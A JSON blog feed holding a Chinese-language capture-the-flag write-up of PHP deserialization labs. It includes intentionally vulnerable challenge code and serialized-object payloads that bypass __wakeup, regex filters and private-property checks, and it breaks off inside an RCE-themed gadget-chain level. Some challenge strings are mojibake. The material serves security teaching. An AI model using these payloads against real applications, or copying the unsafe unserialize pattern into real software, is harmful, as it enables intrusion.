{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/04/27/unserialize-labs/",
            "url": "https://hq185187.github.io/2023/04/27/unserialize-labs/",
            "title": "Unserialize-labs",
            "date_published": "2023-04-27T15:48:42.874Z",
            "content_html": "<h1 id=\"task6-unserialize-labs\"><a class=\"markdownIt-Anchor\" href=\"#task6-unserialize-labs\">#</a> task6 unserialize-labs</h1>\n<h2 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SoFun</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;file)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strchr</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"string\">&quot;\\\\&quot;</span>) === <span class=\"literal\">false</span> &amp;&amp; <span class=\"title function_ invoke__\">strchr</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"string\">&#x27;/&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>) . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$this</span>-&gt;file);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Wrong filename.&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>&lt;!--key in flag1.php--&gt;</span><br></pre></td></tr></table></figure>\n<p>strchr 函数：搜索字符串在另一字符串中的第一次出现<br>\n PHP dirname () 函数是返回文件路径中的目录部分。它给出一个包含有指向一个文件的全路径的字符串，返回去掉文件名后的目录名<br>\n eg <code>dirname(/user/bin)结果是/user</code> <br>\n 绕过 wake_up 方法：当属性个数大于实际个数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SoFun</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$file</span>=<span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">SoFun</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">别忘了加\\<span class=\"number\">00</span>,s显示的位数是<span class=\"number\">7</span>,</span><br></pre></td></tr></table></figure>\n<p>payload: <code>?tryhackme=O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:9:&quot;flag1.php&quot;;&#125;</code> <br>\n<mark> 注意</mark><br>\n保护函数 (protected) 反序列化前要在 <code>*</code>  左右加 <code>\\00</code>  并且小 s 变大 S (不用变值，变属性就可以了), 也可以将 <code>\\00变成%00(0的url)</code> ,</p>\n<h2 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag2.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class=\"line\">   <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[oc]:\\d+:/i&#x27;</span>, <span class=\"variable\">$a</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NONONO!&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>解析<br>\n这个正则表达式会匹配一个以 o 或者 c 开头加一个：后面是一个或者多个数字，再接着一个：的不区分大小写的格式<br>\n<mark>更多关于正则表达式的看我的这篇文章</mark><a href=\"https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/\">正则学习</a><br>\n我们要绕过正则表达式，加一个 + 就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:?tryhackme=O:+5:&quot;funny&quot;:()&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">url编码:?tryhackme=O%3A%2B5%3A%22funny%22%3A0%3A%7B%7D</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"3\"><a class=\"markdownIt-Anchor\" href=\"#3\">#</a> 3.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag3.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$verify</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$nobodyknow</span>;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$nobodyknow</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password === <span class=\"variable language_\">$this</span>-&gt;verify) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;ä½ ä¸•å¤ªè¡Œå•Š??!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里 password 的值被改成了一个不知道的值，可以构造共有地址<br>\n看个例子</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span> php</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&quot;ABC&quot;</span>; </span><br><span class=\"line\"><span class=\"variable\">$b</span> =&amp;<span class=\"variable\">$a</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;<span class=\"comment\">//这里输出:ABC </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;<span class=\"comment\">//这里输出:ABC </span></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&quot;EFG&quot;</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;<span class=\"comment\">//这里$a的值变为EFG 所以输出EFG </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;<span class=\"comment\">//这里输出EFG</span></span><br></pre></td></tr></table></figure>\n<p>构造:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$verify</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$verify</span>=&amp;<span class=\"variable\">$password</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">funny</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.O:5:&quot;funny&quot;:2:&#123;s:6:&quot;verify&quot;;N;s:15:&quot;funnypassword&quot;;N;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">2.\\00funny\\00password</span><br><span class=\"line\">3.%00funny%00password</span><br></pre></td></tr></table></figure>\n<p>或者让 <code>$password=$verify</code>  一样的都可以</p>\n<h2 id=\"4\"><a class=\"markdownIt-Anchor\" href=\"#4\">#</a> 4.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"5\"><a class=\"markdownIt-Anchor\" href=\"#5\">#</a> 5.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag2.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a = <span class=\"string\">&quot;givemeflag&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;a === <span class=\"string\">&quot;givemeflag&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$a</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$a</span>[<span class=\"variable\">$i</span>]) &lt; <span class=\"number\">32</span> || <span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$a</span>[<span class=\"variable\">$i</span>]) &gt; <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ åˆ°åº•è¡Œä¸•è¡Œå•Š&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>只要发序列化后 $a=&quot;givemeflag&quot; 就行了<br>\n脚本太简单了直接放 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:5:&quot;funny&quot;:1:&#123;s:8:&quot;\\00funny\\00a&quot;;s:10:&quot;givemeflag&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"6\"><a class=\"markdownIt-Anchor\" href=\"#6\">#</a> 6.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag6.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pyflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此题没有魔术方法无法进入类中调用类中方法，只能构造一个值为 pyflag 的字符串，里面还得有实例化 (空类字符串)<br>\n 看个例子:<br>\n![[Pasted image 20230427220851.png]]</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"> </span>&#123;</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&#x27;pyflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> funny;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$a</span>,<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?tryhackme=a:2:&#123;i:0;O:5:&quot;funny&quot;:0:&#123;&#125;i:1;s:6:&quot;pyflag&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"7\"><a class=\"markdownIt-Anchor\" href=\"#7\">#</a> 7.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag2.php&quot;</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$object</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">array_walk</span>(<span class=\"variable\">$this</span>, function (<span class=\"variable\">$fn</span>, <span class=\"variable\">$prev</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fn</span>[<span class=\"number\">0</span>] === <span class=\"string\">&quot;system&quot;</span> &amp;&amp; <span class=\"variable\">$prev</span> === <span class=\"string\">&quot;ls&quot;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Wow, you rce me! But I can&#x27;t let you do this. There is the flag. Enjoy it:)\\n&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        @<span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"title function_ invoke__\">add</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"keyword\">string</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span 